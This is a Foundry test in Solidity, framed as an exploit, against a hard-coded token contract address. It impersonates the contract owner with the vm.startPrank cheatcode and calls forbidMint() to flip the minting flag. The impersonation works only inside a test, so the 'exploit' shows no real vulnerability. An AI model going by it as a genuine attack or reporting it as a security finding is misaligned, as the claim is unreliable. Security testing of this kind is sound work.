// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface StandardToken {
    function owner() external view returns (address);
    function forbidMint() external;
    function MINT_FORBIDDEN() external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xEa01D8D9EaCCa9996Db6Bb3377c1Fe64308e7328;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get the current owner
        address owner = StandardToken(TARGET).owner();

        // Label for debugging
        vm.label(owner, "Contract Owner");

        // Impersonate the owner and call forbidMint()
        vm.startPrank(owner);
        StandardToken(TARGET).forbidMint();
        vm.stopPrank();

        // Verify MINT_FORBIDDEN is now true
        bool mintForbidden = StandardToken(TARGET).MINT_FORBIDDEN();
        require(mintForbidden == true, "MINT_FORBIDDEN should be true");
        assertEq(mintForbidden, true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

